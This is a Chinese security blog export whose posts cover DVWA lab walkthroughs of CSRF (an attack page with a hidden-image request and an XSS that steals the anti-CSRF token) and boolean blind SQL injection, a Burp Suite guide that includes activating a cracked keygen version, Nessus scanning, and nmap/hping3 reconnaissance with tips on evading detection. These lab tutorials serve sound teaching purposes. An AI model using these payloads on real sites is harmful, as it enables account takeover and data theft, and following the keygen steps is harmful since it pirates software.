    <content type="text"><![CDATA[CSRF简介CSRF，跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等） CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie，而是直接利用 LOW级别简单利用 构造恶意链接 1http://172.16.12.93/vulnerabilities/csrf/?password_new=password123&amp;password_conf=password123&amp;Change=Change# 被攻击者在登陆网站的情况下点击恶意链接 被攻击者密码在不知情的情况下被修改 简单伪装 网址缩短 使受害者无法通过域名分辨 再次修改密码 当点击短链接后，会自动跳转到长网址，进行密码修改 加强伪装 构造攻击页面 即使URL地址被缩短，但被点击后，仍然会跳转原URL地址，并且会提示密码被修改，使得被攻击者发觉密码被修改 现实攻击场景下，需要在公网上事先上传一个攻击页面，诱使被攻击者去访问，真正能够在受害者不知情的情况下完成CSRF攻击 此处，使用192.168.1.4作为公网服务器，用于演示 攻击页面test.html代码 1234567 &lt;html&gt; &lt;body&gt; &lt;img src=&quot;http://172.16.12.93/vulnerabilities/csrf/?password_new=123456&amp;password_conf=123456&amp;Change=Change#&quot; border=&quot;0&quot; style=&quot;display:none;&quot;/&gt; &lt;h1&gt;error&lt;/h1&gt; &lt;h2&gt;404&lt;/h2&gt; &lt;/body&gt;&lt;/html&gt; 当被攻击者在登陆DVWA的情况下，点击攻击页面的链接，误以为自己点击一个失效的URL,但实际上已经遭受到CSRF攻击，密码已经被修改 Medium级别Medium级别检查了http包头的Referer参数的值，查看其中是否包含http包头的Host参数，希望通过这种机制抵御CSRF攻击 修改攻击页面名称为DVWA主机地址，即可绕过 High级别High级别的代码加入了Anti-CSRF token机制，用户每次访问改密页面时，服务器会返回一个随机的token，向服务器发起请求时，需要提交token参数，而服务器在收到请求时，会优先检查token，只有token正确，才会处理客户端的请求 进行漏洞利用，要绕过High级别的反CSRF机制，关键是要获取token 利用High级别存储型XSS获取token 注入代码： 1&lt;iframe src=&quot;../csrf&quot; onload=alert(frames[0].document.getElementsByName(&apos;user_token&apos;)[0].value)&gt; 构造一次性修改密码恶意链接 1http://172.16.12.93/vulnerabilities/csrf/?password_new=password123&amp;password_conf=password123&amp;Change=Change&amp;user_token=0aeba5f4c30a41b5df742056e383a2e9# 在登陆DVWA的情况下，点击链接，则会更改密码 但恶意链接只可使用一次，再次请求则会显示错误 Impossible级别在修改密码时，要求输入原始密码，用于防止CSRF攻击 CSRF防御 设置Referer，用于标识此次请求从哪个页面过来的 Anti CSRF Token 重要操作进行二次验证]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>DVWA1.10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA1.10之SQL盲注]]></title>
    <url>%2F2019%2F05%2F19%2FVWA1-10%E4%B9%8BSQL%E7%9B%B2%E6%B3%A8%2F</url>
    <content type="text"><![CDATA[SQL盲注SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注 手工盲注的步骤: 判断是否存在注入，注入是字符型还是数字型 猜解当前数据库名 猜解数据库中的表名 猜解表中的字段名 猜解数据 DVWA中SQL语句查询只会返回两种结果: 正常输入 非正常输入 所以为SQL盲注 LOW级别漏洞利用基于布尔的盲注 判断是否存在注入，注入是字符型还是数字型 输入1，显示相应用户存在 输入1&#39; and 1=1--，显示相应用户存在 输入1&#39; and 1=2--，显示用户不存在 存在SQL注入漏洞，且为字符型 猜解当前数据库名首先猜解数据库名长度，然后逐个猜解字符 猜解数据库名长度 输入1&#39; and length(database())=1--，显示用户不存在 输入1&#39; and length(database())=2--，显示用户不存在 输入1&#39; and length(database())=3--，显示用户不存在 输入1&#39; and length(database())=4--，显示相应用户存在 说明数据库名长度为4 逐个猜解数据库名二分法猜解数据库名 输入1&#39; and ascii(substr(database(),1,1))&gt;97--，显示相应用户存在(小写字母a) 说明数据库名的第一个字符的ascii值大于97 输入1&#39; and ascii(substr(database(),1,1))&lt;122--，显示相应用户存在(小写字母z) 说明数据库名的第一个字符的ascii值小于122 输入1&#39; and ascii(substr(database(),1,1))&lt;109--，显示相应用户存在(小写字母m) 说明数据库名的第一个字符的ascii值小于109 输入1&#39; and ascii(substr(database(),1,1))&lt;103--，显示相应用户存在(小写字母g) 说明数据库名的第一个字符的ascii值小于103 输入1&#39; and ascii(substr(database(),1,1))&lt;100--，显示用户不存在(小写字母d) 说明数据库名的第一个字符的ascii值不小于100 输入1&#39; and ascii(substr(database(),1,1))&lt;101--，显示相应用户存在(小写字母f) 说明数据库名的第一个字符的ascii值小于101 说明数据库名的第一个字符的ascii值为100，即字母d 重复上述步骤，可完全猜解出数据库名dvwa 猜解数据库中的表名首先猜解数据库中表的数量，再逐个猜解表名 猜解数据库中表的数量 输入1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=1--，显示不存在 输入1&#39; and (select count(table_name) from information_schema.tables where table_schema=database())=2--，显示相应用户存在 说明dvwa数据库中共有两个表 逐个猜解表名逐个猜解表名的长度 输入1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1--，显示用户不存在 输入1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2--，显示用户不存在 。。。。。 输入1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9--，显示相应用户存在 说明第一个表名长度为9 逐个猜解表名 输入1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97--，显示存在 输入1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122--，显示存在 输入1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109--，显示存在 输入1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103--，显示不存在 输入1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103--,显示不存在 说明第一个表的名字的第一个字符为小写字母g(ascii码103) 重复上述步骤，即可猜解出两个表名（guestbook、users） 猜解表中的字段名猜解表中字段的数量 输入1&#39; and (select count(column_name) from information_schema.columns where table_name= &#39;users&#39;)=1--，显示不存在 。。。 输入1&#39; and (select count(column_name) from information_schema.columns where table_name= &#39;users&#39;)=8--，显示存在 说明users表有8个字段 逐个猜解字段名长度 输入1&#39; and length(substr((select column_name from information_schema.columns where table_name= &#39;users&#39; limit 0,1),1))=1--，显示不存在 。。。 输入1&#39; and length(substr((select column_name from information_schema.columns where table_name= &#39;users&#39; limit 0,1),1))=7--，显示存在 说明users表的第一个字段为7个字符长度 逐个猜解字段名 输入1&#39; and ascii(substr((select column_name from information_schema.columns where table_name= &#39;users&#39; limit 0,1),1,1))&gt;97--，显示存在 。。。 采用二分法，即可猜解出所有字段名user_id,first_name,last_name,user,password,avatar,last_login,failed_login 猜解数据 输入1&#39; and ascii(substr((select user from users limit 0,1),1,1))&gt;97--，显示不存在 。。。 即可猜解出数据]]></content>
      <categories>
        <category>靶机</category>
      </categories>
      <tags>
        <tag>DVWA1.10</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Burp Suite]]></title>
    <url>%2F2019%2F05%2F17%2FurpSuite%2F</url>
    <content type="text"><![CDATA[简介Burp Suite是用于攻击web应用程序的集成平台，包含了许多工具.它包含了许多工具，并为这些工具设计了许多接口，以促进加快攻击应用程序的过程。所有的工具都共享一个能处理并显示HTTP消息，持久性，认证，代理，日志，警报的一个强大的可扩展的框架 Burp Suite是一个Java应用程序，并分发作为一个独立的.jar扩展的Java可执行文件 Burp Suite的模块几乎包含整个安全测试过程，从最初对目标程序的信息采集，到漏洞扫描及其利用，多模块间高融合的配合，使得安全测试的过程更加高效 具体模块分类为： Dashboard(仪表盘)——显示任务、实践日志等 Target(目标)——显示目标目录结构的的一个功能 Proxy(代理)——拦截HTTP/HTTPS的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许你拦截，查看，修改在两个方向上的原始数据流 Intruder(入侵)——一个定制的高度可配置的工具，对web应用程序进行自动化攻击，如：枚举标识符，收集有用的数据，以及使用fuzzing技术探测常规漏洞 Repeater(中继器)——一个靠手动操作来触发单独的HTTP请求，并分析应用程序响应的工具 Sequencer(会话)——用来分析那些不可预知的应用程序会话令牌和重要数据项的随机性的工具 Decoder(解码器)——进行手动执行或对应用程序数据者智能解码编码的工具 Comparer(对比)——通常是通过一些相关的请求和响应得到两项数据的一个可视化的“差异” Extender(扩展)——可以让你加载Burp Suite的扩展，使用你自己的或第三方代码来扩展Burp Suit的功能 Options(设置)——包括Project options和User options，是对Burp Suite的一些设置 安装配置java环境版本jdk1.8 Burp Suite破解版 运行burp-loader-keygen-jas502n.jar程序，点击run 此时会自动打开文件burpsuite_pro_v2.0.11beta.jar，点击I Accept 输入license 选择manual activation 复制Activation Request 复制Activation Response 成功，可以使用 Burp Suite使用配置代理 两个小问题修改软件字体大小，HTTP数据包字体大小，数据包编码格式 重启Burp Suite生效 导入证书为使Burp Suite可以拦截HTTPS流量，需导入Burp Suite证书 配置好Burp Suite浏览器代理 访问http://burp，下载证书 将证书导入浏览器 Scan(扫描)在Dashboard中可以创建扫描任务，进行扫描 Event log中显示事件列表 Issue activity显示任务中发现的漏洞 Target(目标)site map站点地图 用于显示通过爬站、扫描或代理获取到的目标站点 scope用于在site map中包含或排除URL地址 Issue definitions包含所有可由Burp扫描检测到的问题的定义 Proxy(代理)Burp Suite中最重要、最常用的模块 代理模块作为Burp Suite的核心功能，拦截HTTP/HTTPS的代理服务器，作为一个在浏览器和目标应用程序之间的中间人，允许拦截，查看，修改在两个方向上的原始数据流 Intercept用于显示修改HTTP请求及响应内容，并可以将拦截的HTTP请求快速发送至其他模块处理 Forward：用于发送数据。当把所需要的HTTP请求编辑编辑完成后，手动发送数据 Drop：将该请求包丢弃 Intercept is off/on:拦截开关。当处于off状态下时，Burp Suite会自动转发所拦截的所有请求；当处于on状态下时，Burp Suite会将所有拦截所有符合规则的请求并将它显示出来等待编辑或其他操作 Action:功能菜单，与右键菜单内容相同，在这可以将请求包发送到其他的模块或者对数据包进行其他的操作 http history 这里将记录经过代理服务器访问的所有请求，即使当Intercept is off时也会记录 记录包括： #(请求索引号) Host(主机) Method(请求方式) URL(请求地址) Params(参数) Edited(编辑) Status(状态) Length(响应字节长度) MIME type(响应的MLME类型) Extension(地址文件扩展名) Title(页面标题) Comment(注释) SSL IP(目标IP地址) Cookies Time(发出请求时间) Listener port(监听端口) 下方窗口可以显示请求的详细内容（Request）及其响应内容（Response），通过右键菜单也可以将请求发送至其他模块。双击某个请求即可打开详情,通过Previous/next可以快速切换请求，并且Action也可以将请求发送至其他模块 WebSockets history用于记录WebSockets的数据包，是HTML5中最强大的通信功能，定义了一个全双工的通信信道，只需Web上的一个Socket即可进行通信，能减少不必要的网络流量并降低网络延迟 Options主要用于设置代理监听、请求和响应，拦截反应，匹配和替换，ssl等 Proxy Listeners：代理侦听器是侦听从您的浏览器传入的连接本地HTTP代理服务器。它允许您监视和拦截所有的请求和响应，并且位于BurpProxy的工作流的心脏。默认情况下，Burp默认监听127.0.0.1地址，端口8080。要使用这个监听器，你需要配置你的浏览器使用127.0.0.1:8080作为代理服务器。此默认监听器是必需的测试几乎所有的基于浏览器的所有Web应用程序。 Intercept Client Requests：配置拦截规则，设置拦截的匹配规则。当Intercept request based on the following rules为选中状态时，burpsuite会配置列表中的规则进行拦截或转发。注意：如果该复选框未选中，那么即使Intercept is on也无法截取数据包。 规则可以通过Enabled列中的复选框选择开启或关闭。 规则可以是域名，IP地址，协议，HTTP方法，URL，文件扩展名，参数，cookie，头/主体内容，状态代码，MIME类型，HTML页面标题等 规则按顺序处理，并且使用布尔运算符AND和OR组合 Intercept Server Responses：功能类似于配置拦截规则，设置拦截的匹配规则，不过这个选项是基于服务端拦截，当选小的Intercept request based on the following rules为选中状态时，burpsuite会匹配响应包 Intercept WebSockets Messages：用于设置拦截WebSockets数据 Response Modification：用于执行响应的自动修改。可以使用这些选项来自动修改HTML应用程序响应中匹配的内容 Match and replace：用于自动替换请求和响应通过代理的部分。对于每一个HTTP消息，已启用的匹配和替换规则依次执行，选择适用的规则进行匹配执行。规则可以分别被定义为请求和响应，对于消息头和身体，并且还特别为只请求的第一行。每个规则可以指定一个文字字符串或正则表达式来匹配，和一个字符串来替换它。对于邮件头，如果匹配条件，整个头和替换字符串匹配留空，然后头被删除。如果指定一个空的匹配表达式，然后替换字符串将被添加为一个新的头。有可协助常见任务的各种缺省规则，这些都是默认为禁用。 匹配多行区域。您可以使用标准的正则表达式语法来匹配邮件正文的多行区域 SSL Pass Through：指定WEB服务器在经过burpsuite连接时使用SSL连接 Miscellaneous：其他选项，这些选项控制着Burp代理的行为的一些具体细节 Intruder(暴力破解)intruder是一个强大的工具，用于自动对Web应用程序自定义的攻击。它可以用来自动执行您的测试过程中可能出现的所有类型的任务。例如目录爆破，注入，密码爆破等 Target用于配置目标服务器进行攻击的详细信息。 Host：这是目标服务器的IP地址或主机名 Port：这是目标服务的端口号 Use HTTPS：这指定的SSL是否应该被使用 在BurpSuite任何请求处，右键菜单选择Send to intruder选项，将自动发送到此模块下并自动填充以上内容 Positions设置Payloads的插入点以及攻击类型（攻击模式） ttack type：攻击模式设置 sniper：对变量依次进行破解。多个标记依次进行 battering ram：对变量同时进行破解。多个标记同时进行 pitchfork：每一个变量标记对应一个字典，取每个字典的对应项 cluster bomb：每个变量对应一个字典，并且进行交集破解，尝试各种组合。适用于用户名+密码的破解 add：插入一个新的标记 clear：清除所有的标记 auto：自动设置标记，一个请求发到该模块后burpsuite会自动标记cookie、URL等参数 refresh：如果必要的话，这可以要求模板编辑器的语法高亮 Payloads设置payload，配置字典 Payload Sets：Payload数量类型设置 Payload Set：指定需要配置的变量 Payload type：Payload类型 Simple list：简单字典 Runtime file：运行文件 Custom iterator：自定义迭代器 Character substitution：字符替换 Recursive grep：递归查找 lllegal unicode：非法字符 Character blocks：字符块 Numbers：数字组合 Dates：日期组合 Brute forcer：暴力破解 Null payloads：空payload Username generator：用户名生成 copy other payload：复制其他payload Payload Opetions\[Payload type\]：该选项会根据上个选项中Payload type的设置而改变 Payload Processing：对生成的Payload进行编码、加密、截取等操作 Payload Encoding：可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。这是推荐使用此设置进行最终URL编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的grep选项来检查响应为呼应有效载荷的最终URL编码应用之前 Opetions此选项卡包含了request headers，request engine，attack results，grep match，grep_extrack，grep payloads和redirections。可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改 Repeater（上传绕过）Repeater是用于手动操作和发送个别HTTP请求，并分析应用程序的响应一个简单的工具。可以发送一个内部请求从Burp任何地方到Repeater，修改请求并且发送 可以从Proxy history、site map、Scanner等模块中右键菜单send to repeater发送到repeater，对页面数据进行修改发送 点击go，发送请求，右边响应请求 可以通过&lt;和&gt;来返回上一次和下一个操作 单击x可以删除当前测试请求页面 底部的功能用于搜索条件，可以用正则表达式，底部右边显示匹配结果数 该模块的设置在菜单栏Repeater中: Update Content-length：更新头部长度 Unpack gzip/deflate：该选项控制Burp是否自动解压缩在收到的答复的gzip和deflate压缩内容 Follow redirections：在遇到重定向时Burp该怎么处理 Never：不会跟随任何重定向 On-site only：中继器将只跟随重定向到使用相同的主机，端口和协议的URL In-scope Only：中继器将只跟随重定向到的目标范围之内的URL Always：中继器将跟随重定向到任何URL任何责任。 Process cookies in redirections：当被重定向后是否提交cookie View：设置响应/请求版块的布局方式 Action：形同于右键菜单 Sequencer(定序器)用于分析数据项的一个样本中的随机性质量 可以用它来测试应用程序的session tokens或其他重要数据项是否是不可预测的 Live capture Manual load Analysis options Decoder(编码模块)将原始数据转换成各种编码和哈希表的简单工具。它能够智能地识别多种编码格式采用启发式技术 Decode as...：解码 Encode as...：编码 支持的编码解码类型： url HTML Base64 ASCII码 Hex(十六进制) octal(八进制) binary(二进制) GZIP hash：支持的hash算法： SHA-384 SHA-224 SHA-256 MD2 SHA SHA-512 MD5 Smart decoding：智能解码，burpsuite会递归查询自己所支持的格式尝试解码。通过有请求的任意模块的右键菜单send to Decoder或输入数据选择相应的数据格式即可进行解码编码操作，或直接点击Smart decoding进行智能解码 Comparer(比较器)Comparer是一个简单的工具，用于以图形化方式在任意两项数据之间进行比较 常见用途如下： 在查找用户名枚举条件时，您可以使用有效和无效的用户名比较对失败登录的响应，以查找响应中的细微差异 当入侵者攻击导致一些非常大的响应，其长度不同于基本响应时，您可以比较这些响应以快速查看差异所在 在比较不同类型用户生成的站点地图或代理历史记录条目时，您可以比较相似请求对，以查看产生不同应用程序行为的差异所在 当使用布尔条件注入和其他类似测试测试SQL盲注入错误时，您可以比较两个响应，以查看注入不同条件是否导致响应的相关差异 将数据加载到Comparer中的方式： 直接从剪贴板粘贴它 从文件加载它 在Burp中的任何位置选择数据，然后从上下文菜单中选择Send to Comparer 结果会通过高亮显示不同： Extender(扩充器)BurpSuite给出了两种插件安装方法，一种是在线安装：通过BApp Store安装插件；第二种是本地安装：添加本地环境中的插件 在BApp Store中安装插件Extender选项卡，在BApp Store中可以下载安装很多插件 安装自定义插件Extender选项卡中的Extensions中点击add按钮，会弹出根据插件类型选择插件的目录 过滤器的使用在burpsuite中在多个模块都可以看到Fitter过滤器的身影，它们使用方法相同 Fitter by Request type：按照请求类型筛选 Show only in-scope items：只显示范围内的 Show only requested items：只显示请求的 Show only parameterized requests：只显示带有参数的请求 Hide not-found items：隐藏未找到的 Fitter by search term：通过关键字筛选 regex：通过正则表达式匹配 case sensitive：是否区分大小写 negative search：消极搜索，选择后将筛选出不包含该关键字的请求 Fitter by MIME type：通过文件类型筛选 HTML：是否显示HTML文件请求 Script：是否显示脚本文件请求 XML：是否显示标记文件请求 CSS：是否显示层叠样式文件请求 Other text：是否显示其他类型文本请求 images：是否显示图片请求 Flash：是否显示Flash动画请求 Other binary：是否显示其他二进制文件 Fitter by file extension：通过文件后缀筛选 Show only：只显示自定义的后缀请求 Hide：隐藏自定义的后缀请求 Fitter by status code：根据HTTP响应状态码筛选 2xx：显示成功的请求 3xx：显示重定向的请求 4xx：显示请求错误的请求 5xx：显示服务器错误的请求 Fitter by annotation:显示仅显示用户提供的注释或亮点的项目 Show only commented items：只显示注释项目 Show only highlighted items：只显示突出显示的项目 -Folders：是否显示文件夹 hide empty folders：隐藏空文件夹]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>WEB工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[漏洞扫描]]></title>
    <url>%2F2019%2F05%2F15%2F%E6%B4%9E%E6%89%AB%E6%8F%8F%2F</url>
    <content type="text"><![CDATA[如何发现漏洞 基于端口服务扫描结果，查看服务版本信息(速度慢) 搜索已公开的漏洞数据库(数量大) 使用漏洞扫描器实现漏洞管理 从信息的维度定义漏洞管理信息收集扫描发现网络IP、OS、服务、配置、漏洞 需求：能够定义扫描方式内容和目标 信息管理格式化信息，并进行筛选、分组、定义优先级 需求：能够进行资产分组、指定所有者 信息输出向不同层级的人群展示足够的信息量 需求：生成报告、导出数据、可以与SIEM集成 SIEM(安全信息和事件管理)是一个由不同的监视和分析组件组成的安全和审计系统 日志管理(LMS)——用于传统日志收集和存储的工具 安全信息管理(SIM)——集中于从多个数据源收集和管理与安全相关的数据的工具或系统。例如，这些数据源可以是防火墙、DNS服务器、路由器和防病毒应用程序 安全事件管理(SEM)——基于主动监视和分析的系统，包括数据可视化、事件相关性和警报 漏洞扫描的类型 主动扫描 是否可进行身份认证 被动扫描 镜像端口抓包分析 基于Agent的扫描 漏洞的基本概念漏洞是在硬件、软件、协议的具体实现或系统安全策略上存在的缺陷，从而可以使攻击者能够在未授权的情况下访问或破坏系统 CVSS 通用漏洞评分系统，工业标准 描述安全漏洞严重程度的统一评分方案 分值范围：0–10 不同机构按CVSS分值定义威胁的中、高、低威胁级别 CVSS体现漏洞的风险 威胁级别表示漏洞对那个风险对企业的影响程度 CVE 已公开的信息安全漏洞字典(MITRE公司维护) 统一的漏洞编号标准 实现不同厂商之间信息交换的统一标准 MS微软漏洞编号 KB：微软补丁编号 OVAL 描述漏洞检测方法的机器可识别语言 详细的描述漏洞检测的技术细节，可导入自动化检测工具中实施漏洞检测工作 以XML语言描述 SCAP集合了多种安全标准的框架 六个元素：CVE、OVAL、CCE、CPE、CVSS、XCCDF 目的使以标准的方法展示和操作安全数据 由NIST(美国国家标准技术研究所)负责维护 解决三个问题： 实现高层政策法规等到底层实施的落地 将信息安全所涉及的各个要素标准化 将复杂的系统配置核查工作自动化 CNVD国家信息安全漏洞共享平台（CNVD）是由国家计算机网络应急技术处理协调中心（中文简称国家互联应急中心，英文简称CNCERT）联合国内重要信息系统单位、基础电信运营商、网络安全厂商、软件厂商和互联网企业建立的信息安全漏洞信息共享知识库 漏洞管理 周期性扫描跟踪漏洞 高危漏洞优先处理 进行合理的扫描 Nessus简介家庭版：免费使用 专业版：收费，无限并发连接 安装参见 Kali下安装Nessus 扫描在“扫描”页面上，您可以创建，查看和管理扫描和资源。要访问“扫描”页面，请在顶部导航栏中单击“扫描”。左侧导航栏显示文件夹和资源两部分。 文件夹“文件夹”部分始终包含以下不能删除的默认文件夹：我的扫描、所有扫描、废纸篓 当您访问“扫描”页面时，将显示“我的扫描”文件夹。当您创建扫描时，它默认显示在“我的扫描”文件夹中 在所有扫描的文件夹显示所创建的所有扫描以及与有权限进行交互的任何扫描。可以点击文件夹中的扫描来查看扫描结果 “废纸篓”文件夹显示已删除的扫描。可以从Nessus实例中永久删除扫描，或将扫描恢复到选定的文件夹。如果删除包含扫描的文件夹，则该文件夹中的所有扫描都将移至“废纸篓”文件夹。存储在“废纸篓”文件夹中的扫描将在30天后自动删除。 资源策略 插件规则 扫描器 资源之策略 控制扫描技术方面的参数，如超时时间，主机数量，端口扫描器类型等等 用于本地扫描（例如Windows，SSH），经过身份验证的Oracle数据库扫描，HTTP，FTP，POP，IMAP或基于Kerberos的身份验证的凭证 精细的家庭或基于插件的扫描规范 数据库合规性策略检查，报告详细程度，服务检测扫描设置，Unix合规性检查等等 对网络设备进行脱机配置审计，可以安全检查网络设备，而无需直接扫描设备 Windows恶意软件扫描，比较文件的MD5校验和，包括已知的好文件和恶意文件 资源之插件规则允许隐藏或改变任何给定的插件的严重性。另外，规则可以限制在特定的主机或特定的时间范围内。在此页面上，您可以查看，创建，编辑和删除您的规则 资源之扫描器该扫描器页面显示的链接键和遥控器的扫描器列表。您可以点击链接的扫描器查看有关该扫描器的详细信息 扫描器由扫描器类型标识，并指示扫描器是否具有共享权限 可以使用链接密钥或有效帐户凭证将远程扫描器链接到Nessus Manager。一旦链接，扫描器可以在本地进行管理，并在配置扫描时进行选择 扫描模板 扫描模板之设置每个策略都存在以下设置，但可用的配置项目可能因所选模板而异 基本 发现 评定 报告 高级 扫描模板之凭证每个策略都存在以下设置，但可用的配置项目可能因所选模板而异 云服务： AWS：亚马逊网络服务 Microsoft Azure：微软基于云计算的操作系统 Rackspace：全球三大云计算中心之一，是一家全球领先的托管服务器及云计算提供商，公司总部位于美国 Salesforce.com：Salesforce是处于世界首位的开发CRM客户关系管理平台。软件基于云端，因此用户不需要IT专家团队进行安装设置或管理，只需登陆即可使用 Red Hat Enterprise Virtualization：红帽企业虚拟化 数据库：包括MongoDB，Oracle，MySQL，DB2，PostgreSQL和SQL Server 主机：其中包括Windows登录，SSH和SNMPv3 其他服务：VMware，Red Hat Enterprise Virtualization等 明文身份验证机制：包括FTP，HTTP，POP3和其他服务 扫描模板之插件插件选项可以选择插件系列的安全检查或单个插件检查 点击插件系列，您可以启用（绿色）或禁用（灰色）整个系列。选择一个系列显示其插件列表。可以启用或禁用单个插件来创建特定的扫描 禁用某些插件的系列是紫色的，并显示混合，表明只有一些插件已启用。点击插件家族加载完整的插件列表，并允许根据您的扫描偏好细粒度选择 插件的详细信息包括 摘要，说明，解决方案，插件信息和风险信息 设置 关于 高级 代理服务器 SMTP服务器 自定义CA 密码管理 扫描健康 我的帐户 设置之关于”关于”页面显示Nessus许可和插件信息的概述。当您访问产品设置时，默认情况下出现关于页面 设置之高级高级设置允许您手动配置全局设置。为了使这些设置生效，可能需要重新启动Nessus服务或服务器。注意:在扫描或策略中配置的设置将覆盖这些值 设置之代理服务器代理服务器用于转发HTTP请求。如果您的组织需要一个，Nessus将使用这个代理服务器从可靠的地方获得软件更新。只需要主机和端口字段。如果需要，可以使用用户名、密码、身份验证类型和用户代理 设置之邮件服务简单邮件传输协议(SMTP)是发送和接收电子邮件的行业标准。一旦为SMTP配置好，扫描结果将通过电子邮件发送到扫描的“电子邮件通知”配置中指定的收件人列表。这些结果可以通过过滤器定制，并需要一个HTML兼容的电子邮件客户端 设置之自定义CA在扫描期间保存自定义证书颁发机构(CA)有助于减轻来自插件#51192 (SSL证书不可信)的发现 设置之密码管理密码管理允许您设置密码参数，以及打开登录通知和设置会话超时。登录通知允许用户查看最近一次成功登录、最近一次失败登录尝试(日期、时间和IP)以及自上次成功登录以来是否发生了任何失败的登录尝试。更改将在软重启后生效 设置之扫描健康以图表的方式显示NESSUS的运行健康状态 设置之我的账户此页面可进行账户密码更改、API密钥生成等]]></content>
      <categories>
        <category>漏洞</category>
      </categories>
      <tags>
        <tag>信息安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[信息收集--主动]]></title>
    <url>%2F2019%2F05%2F14%2F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E4%B8%BB%E5%8A%A8%2F</url>
    <content type="text"><![CDATA[被动信息收集的结果可能不准确，并不是最新的。利用主动信息收集来进行验证 流程： 发现存活主机–&gt;扫描开放端口–&gt;识别端口对应的应用程序–&gt;利用应用程序漏洞–&gt;通过端口攻击进入系统 要求 直接与目标进行交互 使用代理、第三方受控的计算机进行探测(避免目标系统封堵IP) 做好被封IP的准备 使用噪声迷惑目标，淹没真实的探测流量(伪造IP迷惑目标，将真实的探测隐于其中) 主机发现发现阶段用于识别活着的主机(潜在的攻击目标) 二层主机发现使用协议：ARP协议 优点：扫描速度快，可靠 缺点：不可路由，只可发现本网段内的主机，不可跨网段扫描 arping1arping 1.1.1.1 -c 1 nmap123nmap -sn 1.1.1.1-sn：ping扫描，禁止端口扫描 netdiscover专用于二层发现，可用于无线和有线网络，可选择主动或被动探测方式 主动探测1netdiscover -i eth0 -r 192.168.1.0/24 被动探测将网卡置于混杂模式，用于嗅探网络中的ARP数据包，根据ARP数据包判断主机是否存活 1netdiscover -p 三层主机发现使用协议：IP协议、ICMP协议 优点：可路由，速度较快 缺点：速度比二层慢，可能被边界防火墙过滤 ping1ping 1.1.1.1 -c 5 traceroute1traceroute www.baidu.com 四层主机发现使用协议：TCP协议、UDP协议 优点：可路由，结果可靠 缺点：基于状态过滤的防火墙可能过滤扫描 TCP主机发现原理：向主机IP主机发送未经请求的ACK数据包 若目标IP存在，不论用于探测的端口是否开放，都将返回RST数据包 若目标IP不存在，将无任何返回 nmap1nmap 1.1.1.0/24 -PA80 -sn hping31hping3 1.1.1.1 -c 1 UDP主机发现原理： 若目标存在，用于探测的端口也是开放的，则用于探测的包会一去不复返，无回包 若目标不存在，则用于探测的包会以取不复返，无回包 只有目标存在，用于探测的端口是未开放的，目标主机才会返回ICMP端口不可达，以证明目标存在 nmap1nmap 1.1.1.0/24 -PU2356 -sn hping31hping3 --udp 1.1.1.1 -c 1 端口扫描通过扫描服务器开放端口以及从该端口判断服务器上存在的服务，最常见的工具是nmap，无状态端口扫描工具Masscan、ZMap和御剑高速TCP端口扫描工具 常见端口及攻击方向文件共享 远程连接 web应用 数据库服务 邮件服务 网络常见协议端口 特殊服务 TCP端口扫描全连接扫描完整进行三次握手过程，结果非常准确，但容易被目标发现 nmap1nmap -sT 1.1.1.1 -p 100-200 dmitry1dmitry -p 1.1.1.1 隐蔽扫描对目标端口发送SYN数据包 若目标端口开放，会返回SYN+ACK数据包 若目标端口未开放，会返回RST数据包 nmap1nmap -sS 1.1.1.1 -p 1-100 hping31hping3 1.1.1.1 --scan 1-100 -S UDP端口扫描对目标指定端口发送请求 若目标返回ICMP端口不可达，表示目标端口关闭 若目标未返回任何数据包，则认为目标端口开放，存在误判 nmap1nmap -sU 1.1.1.1 服务扫描要求： 识别开放端口上运行的应用 识别目标操作系统 获取Banner信息Banner信息：软件开发商、软件名称、服务类型、版本号 nc1nc -nv 1.1.1.1 53 dmitry1dmitry -pb 1.1.1.1 nmap1nmap -sT 1.1.1.1 -p 1-100 --script=banner.nse amap1amap -B 1.1.1.1 902 服务识别根据响应特征分析识别服务：发送一系列复杂的探测，依据响应判断 nmap1nmap 1.1.1.1 -p 1-100 -sV 操作系统识别TTL起始值 Windows：128，范围65–128 Linux/Unix：64，范围1-64 某些Unix：255 nmap1nmap -O 1.1.1.1 被动分析监听网络内数据包，以判断与本机进行数据通信的主机的操作系统类型 CMS指纹识别指纹由于终身性、不变性、唯一性和方便性，几乎已经成为生物识别的代名词 这里指网站CMS指纹识别及web容器的指纹识别等 应用程序一般在html、js、css等文件中会包含一些特征码，比如wordpress在robots.txt中会包含wp-admin、首页index.php中会包含generator=wordpress 3.xx，这就是CMS指纹 CMS(Content Management System)称为整站系统或文章系统。开发者需提供一个软件包，客户进行安装配置、维护内容就可以 